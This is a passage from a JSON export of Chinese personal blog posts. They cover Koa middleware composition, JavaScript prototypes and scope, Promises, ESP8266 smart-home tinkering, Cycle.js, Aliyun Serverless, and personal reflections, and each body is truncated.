    "Content": "## Koa 洋葱模型\r\n\r\nKoa 中间件使用洋葱模型的优势是可以非常方便的实现前置与后置处理逻辑，比如最简单的请求时间计算中间件，在 Koa 模型中就非常容易实现。\r\n\r\n![](https://camo.githubusercontent.com/d80cf3b511ef4898bcde9a464de491fa15a50d06/68747470733a2f2f7261772e6769746875622e636f6d2f66656e676d6b322f6b6f612d67756964652f6d61737465722f6f6e696f6e2e706e67)\r\n\r\n## compose 实现\r\n\r\n在 Koa 中最重要的概念应该是中间件的洋葱模型，这个模型是通过 compose 函数来实现的，我们知道 Koa 中间件是一个函数（可以是异步函数）它接受 `context、next`两个参数，在 `context`里封装了`Request、Response`，并通过`next`来调用下一级中间件。\r\n\r\nKoa 会根据中间的注册顺序依次调用，并将这个控制流通过 `next` 参数暴露给程序员，因而中间件的编写相当于手写 CPS 风格的代码，每当 next 被调用时就将控制传递给下一层中间件，当没有下一层中间件时再展开整个函数栈（如果中间件特别多，那应该会有问题，不过哪有那么多中间件啊），Koa 这种控制的传递很容易让人联想到 `generator`，实际上早期的 koa 就是这样实现的。\r\n\r\n我们来实现一个简单的 compose 函数原型（实际上 Koa 源码的实现本来就很简单）：\r\n\r\n```javascript\r\nfunction compose(middlewares) {\r\n    return function(context, next) {\r\n        let index = -1\r\n        function exec(i) {\r\n            if (i == middlewares.length) return\r\n            // 将 index 作为判断 next 重复调用的判断条件\r\n            if (i <= index) throw 'next() 被多次调用!'\r\n            index = i\r\n            return middlewares[i](context, exec.bind(null, i + 1))\r\n        }\r\n        return exec(0)\r\n    }\r\n}\r\n```\r\n\r\n`compose` 接收一个中间件组成的数组，当有请求时依次按注册顺序调用这些中间件，并维持 `context` 的传递即可，但是这里按注册顺序依次调用的控制流是由程序员通过 `next` 控制的，`next` 就是**下一个中间件函数的抽象**，因而我们用一个闭包函数 `exec` 来实现，每次调用时传递下一个中间件函数的 index 即可。\r\n\r\n```javascript\r\nfunction f1(ctx, next) {\r\n    console.log('1')\r\n    next()\r\n    console.log('xxx1')\r\n}\r\n\r\nfunction f2(ctx, next) {\r\n    console.log('2')\r\n    next()\r\n    console.log('xxx2')\r\n}\r\n\r\nfunction f3(ctx, next) {\r\n    console.log('3')\r\n    next()\r\n    console.log('xxx3')\r\n}\r\n\r\ncompose([f1, f2, f3])({ name: 'ctx' })\r\n// 1\r\n// 2\r\n// 3\r\n// xxx3\r\n// xxx2\r\n// xxx1\r\n```\r\n\r\n但是这个实现有一个问题，如果考虑我们的中间件是一个异步函数(async function)，我需要支持 `await next()`这样的操作并且统一处理所有中间件的错误，为此我们要把所有的中间件执行结果用 `Promise` 包起来。<strong>……</strong>"
  },
  {
    "fileName": "JS任督二脉-原型.md",
    "ID": 64,
    "Title": "JS任督二脉-原型",
    "Tags": "编码 | 前端",
    "PublishDate": "2015/12/24 23:43",
    "Content": "JavaScrpit中的类型有如下几种，除去一般类型以外其余都是对象。\r\n1. Number\r\n2. String\r\n3. Boolan\r\n4. Symbol (ES6新增)\r\n5. Object\r\n    * Function\r\n    * Array\r\n    * Date\r\n    * RegExp\r\n6. Null\r\n7. undefined\r\n\r\n**对象:** 对象在js中是一个键值对的集合，早期的js中并没有类Class，但类的概念却通过Object Prototype得以延续。\r\n在了解js中对象这个概念的基础上，再来看js的原型，相比涉及诸多底层实现概念的作用域而言，原型就容易懂得多，要弄懂原型，只涉及三个关键字: [[prototype]]、prototype、constructor\r\n\r\n一般情况下，我们这样来创建一个对象和函数：  \r\n```\r\n    var MyObject = {\r\n        name: 'myobject',\r\n    };\r\n\r\n    var MyFunction = function () {\r\n        name = 'myfunction';\r\n    };\r\n\r\n```\r\n\r\n当然，对象还可以通过new Class() 的方式来建立，在类似java的语言中中我们是通过构造方法\r\n来实例化一个对象的，在js中的new关键字也能\"实例化\"一个对象（实际上JavaScript不存在类，有的只是对象），而用来实例化的构造方法即是js的函数，对这样的方法我们称为**constructor**，但是对于js而言，**并不区分一般函数和构造函数**，只有在通过new 关键字来使用函数时才被当作是构造函数，用来“实例化一个对象”。\r\n使用构造函数实例化对象时这样写：\r\n```\r\n    var ClassA = function () {\r\n        this.className = 'A';\r\n    };\r\n    classa = new ClassA();\r\n```\r\n这样就得到了一个对象classa，看到new关键字，很多人都会觉得熟悉，但实际上这只是幻觉，它真真的机制并非如此。\r\n查看ClassA的属性，我们会发现一个ClassA.prototype对象，它有一个名为ClassA.prototype.constructor的属性，它是函数自身的引用，从字面上理解都以为是构造器，然后我们考虑下面代码：\r\n```\r\nfunction Foo() {      // ... }  \r\nFoo.prototype.constructor === Foo; // true  \r\nvar a = new Foo();  a.constructor === Foo; // true\r\n```\r\n我们猜测，当使用new Foo()创建对象a的时候，Foo.prototype.constructor作为构造函数创造了对象a，\r\n从 a.constructor === Foo可以看出。<strong>……</strong>"
  },
  {
    "fileName": "JS任督二脉-作用域.md",
    "ID": 65,
    "Title": "JS任督二脉-作用域",
    "Tags": "编码 | 前端",
    "PublishDate": "2015/12/8 22:40",
    "Content": "# 引言  \r\n多数人初次使用JavaScript的时候，恐怕都将其作为一种粘合剂使用，用诸如JQuery之类的库来控制页面为，与后端交互等。\r\n当然，这并没有错，这门语言在设计之初就是如此考虑的，但是随着Web技术的发展，JS却出乎意料的成为了浏览器语言的最终胜利者，并被各大浏览器支持，性能也得到了质的提升，隐隐有成为浏览器上的汇编语言这一趋势，出现了诸多以JS代码作为编译目标的语言，如CoffeeScript，TypeScript。\r\n\r\n随着Node.js等一系列的技术出现，JS的领域甚至被拓展至了浏览器之外，如React-Native开发ios、Android应用，GitHub开发的Atom编辑器，即便是在Web端，随着各种前端框架、工程化工具的不断涌现，JS也越来越受到重视，现在JavaScript已经成为了世界上使用最广泛的软件平台，互联网的核心技术。\r\n\r\n**是时候严肃认真的学习它了，深入才能察觉深度，当你学习诸如闭包，this，作用域链，原型链等概念的时候，你会发现JS并不简单！**\r\n\r\n# 作用域与原型\r\n## 作用域\r\n为什么称其为JS的任督二脉？与之相关的概念有作用域链、原型链，而JS中那些最复杂的概念，如闭包等概念其实都在建立在这两套机制之上的，可以说理解了JS的作用域与原型，就掌握了JS精髓的70%!，也只有理解了这两个概念，才能从容自信的使用JS中的各种魔法，或是处理各种奇怪的问题。\r\n作用域一词从字面上来理解，即代码中标识符被限定的可见范围，某些标识符并不总是可见的，会因为声明位置的不同而有所差异。<strong>……</strong>"
  },
  {
    "fileName": "JS 学习补遗.md",
    "ID": 66,
    "Title": "JS 学习补遗",
    "Tags": "前端",
    "PublishDate": "2018/8/13 0:40:49",
    "Content": "## Promise\r\n\r\n### Promise.prototype.finally()\r\n\r\n通常我们知道 JS 里 Promise 的实例方法有 `then、catch` ES2018 还引入 `finally`，这意味着 Promise 的状态无论如何，该方法都会调用，通常用于善后处理，比如文件打开完事后关闭，它和`catch`一样，都是 `then`的一个特例，最新还有一个 `Promise.try()` 提案，用于统一处理异步与同步异常。\r\n\r\n### Promise.race()\r\n\r\n我知道有 `Promise.all()`可以将多个 Promise 包装成一个新的实例，在所有 Promise 实例 `fulfilled` 后该实例才 `fulfilled` 。但还有一个 `Promise.race()` 同样可以包装多个 Promise 实例，但只要其中任意一个实例率先 `fulfilled`，该新实例状态就会 `fulfilled`，并接收率先`fulfilled`实例的返回值，这不是新的方法，也许以前看过，但因为没有应用场景被遗忘了，对于同一个数据有两个接口可用，使用最快响应的接口数据，这样的场景下可以考虑该方法。\r\n\r\n```javascript\r\nlet p1 = new Promise((resolve, reject) => {\r\n  setTimeout(() => resolve('p1'), 1100)\r\n})\r\nlet p2 = new Promise((resolve, reject) => {\r\n  setTimeout(() => resolve('p2'), 500)\r\n})\r\n\r\nPromise.race([p1, p2]).then(res => console.log(res)) // p2\r\n```\r\n\r\n## Generator\r\n\r\n直接用上了 `async/await`，对`Generator`仅停留在了解的层面，但是最近写业务代码似乎想起来可以用这玩意啊，\r\n\r\n通常我们的业务系统根据 Use Case 拆分成了一系列服务，这意味着开发一个场景的功能需要调用多个异步请求服务，尽管我们用 `Promise` 和 `async/await`解决了多个异步调用下的回调地狱问题，但我期望能有这样一个函数，它代表着某一个 Use Case 的抽象，每次调用喂一部分参数，全部喂完后就给我结果。\r\n\r\n比如说我们业务有这样一个复杂地查询场景，查询一份报告需要这样几步，每步都涉及服务调用。<strong>……</strong>"
  },
  {
    "fileName": "esp8266折腾日记.md",
    "ID": 67,
    "Title": "ESP8266 折腾日记",
    "Tags": "硬件",
    "PublishDate": "2019/8/10 23:25:11",
    "Content": "为了保护好家里的植物萌生了开发一套自动浇水系统的念头，再结合最近养了只猫（天猫精灵）脑子里念头一下涌出许多，做一个家庭环境监控系统接入天猫精灵语音控制怎样？「天猫精灵，家里环境状况如何？」，「温度 27 湿度 55 污染 0 状况良好」，这样的想法似乎很美好啊。\r\n\r\n说干就干，本来想最近新出的树莓派4，但是想想之前吃灰的经历便作罢，又仔细找了找一些单片机开发的资料发现了 esp8266 这块神奇的芯片，严格来说这不是单片机，而是一块 WIFI 模块，但是自带一个 32 位的 MCU 令它在国内外都非常火，我们甚至可以用 microPython 来做开发，简直不要太友好了。\r\n\r\n限于手中的材料，我先做了个简单的温度、湿度显示器练手，毕竟我是一个从未接触过硬件的前端开发，这种硬件活还是有点硬了。做好之后便想着如何连接到天猫精灵，看了天猫精灵的接入文档后发现需要一个公网的机器来做 oAuth2 鉴权认证以及处理语音解析结果，最后才对设备下达控制命令。可是阿里云的 ECS 主机 500 一年啊大兄弟，这可比物料成本贵多了，劝退，以后考虑吧。<strong>……</strong>"
  },
  {
    "fileName": "ESP8266天猫精灵接入.md",
    "ID": 68,
    "Title": "ESP8266 天猫精灵接入",
    "Tags": "硬件",
    "PublishDate": "2019/8/31 20:00:11",
    "Content": "一开始生起想要玩一玩 ESP8266 的念头时，目的就是为了能够将自己的硬件设备接入天猫精灵，通过语音来控制。如果只是做一个无聊的温度显示器，说实话我才不想折腾。最终经过权衡与思考，我还是决定继续朝着我最初的设想前进，即将自制的硬件设备接入天猫精灵。\r\n\r\n上回也提到接入天猫精灵所遇到的困难，其中最重要的就是公网 IP 的服务器，所以我最终还是购买了 288RMB 的套路云轻量级主机，当然，这也有其他考量，比如梯子的需求。\r\n\r\n接入天猫精灵有**两种途径**：\r\n\r\n1. **智能家居-云云自助接入**\r\n2. **自定义技能+动态内容接入**\r\n\r\n这两种我都有尝试，其中第一种是最难搞的，但反而是可玩性最弱的，一顿折腾下来只觉坑爹！\r\n\r\n## 接入的准备\r\n\r\n1. 一台公网可访问的服务器 \r\n2. 一个 ESP8266，别的什么可联网的硬件开发板子都行\r\n3. 一个域名\r\n4. https 证书\r\n\r\n## 云云接入方案\r\n\r\n这是最难搞的方案，因为你既要充当设备厂商的云服务器做鉴权与授权，又要实现开发者网关，接收控制指令。<strong>……</strong>"
  },
  {
    "fileName": "Cycle.js 体验.md",
    "ID": 69,
    "Title": "Cycle.js 体验",
    "Tags": "前端",
    "PublishDate": "2018/3/25 20:38:26",
    "Content": "之前学习了流的概念，那么理所当然的会想到其应用，特别是在前端领域大规模应用函数式编程范式的情况下，果不其然，我发现了Cycle.js 这个框架，相比于 React ，Cycle.js 可谓是更加彻底的函数式了。\r\n```javascript\r\nfunction main(sources) {\r\n  const sinks = {\r\n    DOM: sources.DOM.select('input').events('click')\r\n      .map(ev => ev.target.checked)\r\n      .startWith(false)\r\n      .map(toggled =>\r\n        <div>\r\n          <input type=\"checkbox\" /> Toggle me\r\n          <p>{toggled ? 'ON' : 'off'}</p>\r\n        </div>\r\n      )\r\n  };\r\n  return sinks;\r\n}\r\nconst drivers = {\r\n  DOM: makeDOMDriver('#app')\r\n};\r\nrun(main, drivers);\r\n```\r\n\r\n\r\n\r\n<img src=\"http://cyclejs.cn/img/hci-inputs-outputs.svg\" alt=\"HCI 输入 输出\" width=\"500px\">  \r\n\r\n\r\n\r\n整个框架的核心是一个不到两百行代码的 run 函数。让我们思考这样一种人机交互模型，计算机接受用户的操作作为输入，并输出一个新的视图，人的眼睛作为感知器将计算机输出的视图作为输入，输出一个操作。\r\n\r\n```javascript\r\ncomputer(Input) => Output\r\nHuman(senses) => Actuator\r\n```\r\n在这个模型里，人与计算机互为观察者，二者都可以抽象为一个函数，而 run 的作用就是将这两个函数连接起来，这也就是 cycle.js 的由来。\r\n\r\nrun 的第二个参数实际上是一个 driver，用来执行 JS 代码的副作用，即那些影响外部世界到操作，比如将 Virtual DOM 渲染到真实屏幕，捕捉各种事件等。<strong>……</strong>"
  },
  {
    "fileName": "coding.md",
    "ID": 70,
    "Title": "coding",
    "Tags": "碎念",
    "PublishDate": "2017/7/20 01:35:08",
    "Content": "![](http://imglf0.nosdn.127.net/img/UUcvQWZBZk9URHhUNmthQzQxSXpDZnFmRWN3aTQ5MGozdXh2NUF6RlZFM0hWRUluM3dWaFZnPT0.jpg?imageView&thumbnail=1680x0&quality=96&stripmeta=0&type=jpg)\r\n在公司忙活项目的Coding，回到家中亦是摆弄自己的代码，对我而言却是极其幸运的，因为爱好即是工作。  \r\n张嘴就唠叨个不停，没人聊就撩计算姬好了😂<strong>……</strong>"
  },
  {
    "fileName": "AliyunServerless.md",
    "ID": 71,
    "Title": "Aliyun Serverless 体验",
    "Tags": "编程",
    "PublishDate": "2019/7/13 16:33:40",
    "Content": "VS Code 阿里云函数计算的插件 **Aliyun Serverless VSCode Extension**，它能让你在 VS Code 上做函数计算的开发，关于函数计算，或者说 **Serverless** 的概念就不多说了，对于前端来说它算的上是某种革命性的技术。全栈工程的门槛将进一步降低，我们写后端服务仅需要编写相关的函数即可，调用按时间或是次数收费，开发者不需要关系服务器的搭建，环境安装与配置等一堆依赖问题，只需要专注于函数编写即可。\r\n\r\n## 安装踩坑之旅\r\n\r\n在 VS Code 上装好插件后开始 Coding，如果需要本地调试则需要安装  \r\n\r\n`npm install @alicloud/fun -g`\r\n\r\n这个好搞定，关键是 docker 的安装，在 Window 上就必然是踩坑之旅了，首先，docker 依赖底层的 linux 内核提供的能力，在 Windows 上跑 docker 是需要 **Hyper-V** 虚拟机的，而我本机的 **Windows 10 家庭高级版** 并不能使用该功能。\r\n\r\n1. 想办法把电脑升级到 Win10 专业版本后，启用 Hyper-V，把 Docker 装上。\r\n\r\n你以为这就结束了？ Docker 是一个在墙外的东西，启动时安装各种依赖的速度贼慢，因此要配置镜像，  好在阿里云提供了镜像服务。<strong>……</strong>"
  },
  {
    "fileName": "2019年7月18日002002.md",
    "ID": 72,
    "Title": "无题",
    "Tags": "碎念",
    "PublishDate": "2019/7/18 00:20:44",
    "Content": "![mmexport1563241250716](https://ksana.oss-cn-shenzhen.aliyuncs.com/articles/imgs/mmexport1563241250716.jpg)\r\n\r\n图片来自朋友圈正在西藏骑行的删哥，我真的很羡慕她，恨不能让她带上我的眼，她的目的地在西藏阿里，而我此刻在杭州阿里。\r\n\r\n你爱的愈多，对孤独的抵抗力越弱。别以为孤独可以享受，它永远是折磨人的魔鬼，只不过能迫使你寻求一些事情来做从而赋予生活一些意义。\r\n\r\n我对孤独的抗性被重重砍了一刀，前所未有的虚弱令我时常徘徊于自闭与莫名的兴奋之中，曾经为自己筑起抵御孤独的内心世界此刻也变成了一片荒芜，现在我又要重新为这个世界种上花，让阳光透过裂缝再次照进来。<strong>……</strong>"
  },
  {
    "fileName": "2018年计划与回顾.md",
    "ID": 73,
    "Title": "2018年计划与回顾",
    "Tags": "碎念",
    "PublishDate": "2018/1/20 17:19:52",
    "Content": "深圳回来后，从年初到现在一直都在忙碌着家里的各种事情，终于明白在深圳的时候妈妈每次视频通话都说“家里没事，不用你操心”这句话背后有多艰难了。上周四是母亲五十岁生日，为此刻意驱车回老家置办了酒席，邀请了那些我既陌生又熟悉的七大姑八大姨，自从读大学之后就许久未曾回过老家，亲戚们对我倒是印象深刻，可能是小时候特别皮吧，反而我自己好多都叫不出名字了，不过，最重要的是父母开心就好。\r\n\r\n父母的事情告一段落后，终于有闲考虑下自己今年的规划了，老家寒冷的天气着实容易让人提不起劲来，想到几乎每天都被被窝封印许久，年轻的时光就这样被挥霍还是很愧疚的。本来今年的唯一规划就是在家陪伴父母然后安心学习考研，对我而言，趁着年轻投入更多精力去学习或许是收益最大的选择。不过父亲恢复的状态让我这心又躁动了起来，父亲在愈后复健的活动上主观能动性惊人的强，不需要我和母亲的提醒，每天就自觉的按时去做各种恢复肢体运动的动作，即便丧失了大部分语言能力，在我给他装上认字的 APP 后也是每天跟着 APP 每天练习认字和发音，偶尔也能完整的清晰的说出一段话来，这样的状态也确实让我感到非常欣慰，抛开这些，父亲单位的省里领导又来慰问，这让我对某国企单位的好感倒是增加了不少。<strong>……</strong>"
  }
]